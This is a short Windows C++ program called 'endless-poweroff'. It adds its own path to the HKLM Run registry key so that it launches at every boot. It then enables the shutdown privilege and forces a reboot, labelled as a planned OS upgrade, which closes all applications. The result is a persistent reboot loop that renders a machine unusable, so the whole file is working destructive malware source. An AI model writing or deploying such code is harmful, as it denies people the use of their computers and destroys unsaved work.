// endless-poweroff.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include<windows.h>
#include<stdio.h>
#include<Winuser.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")

BOOL MySystemShutdown()
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	// Get a token for this process. 

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		return(FALSE);

	// Get the LUID for the shutdown privilege. 

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME,
		&tkp.Privileges[0].Luid);

	tkp.PrivilegeCount = 1;  // one privilege to set    
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Get the shutdown privilege for this process. 

	AdjustTokenPrivileges(hToken, FALSE, &tkp, 0,
		(PTOKEN_PRIVILEGES)NULL, 0);

	if (GetLastError() != ERROR_SUCCESS)
		return FALSE;

	// Shut down the system and force all applications to close. 

	if (!ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
		SHTDN_REASON_MAJOR_OPERATINGSYSTEM |
		SHTDN_REASON_MINOR_UPGRADE |
		SHTDN_REASON_FLAG_PLANNED))
		return FALSE;

	//shutdown was successful
	return TRUE;
}

int _tmain(int argc, _TCHAR* argv[])
{
	HKEY hKey = { 0 };//Get a handle to an open registry key. 
	LPCTSTR path = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";//The registry subkey to be opened.
	//Opens the specified registry key.
	//If the system is 64bits ,please introduce a paramete of KEY_WOW64_64KEY .
	RegOpenKeyEx(HKEY_LOCAL_MACHINE, path, 0, KEY_WRITE|KEY_WOW64_64KEY, &hKey);
	
	TCHAR sz_path_c[MAX_PATH];
	//Retrieves the fully qualified path for the file that contains the specified module.
	GetModuleFileName(nullptr,sz_path_c,MAX_PATH);
	//Sets the data and type of the sz_path_c under a registry key.
	RegSetValueEx(hKey, L"endlesspoweroff", 0, REG_SZ, (LPBYTE)sz_path_c, sizeof(TCHAR)*(wcslen(sz_path_c)));
	//Closes the handle to the specified registry key.
	RegCloseKey(hKey);
	MySystemShutdown();
    return 0;
}

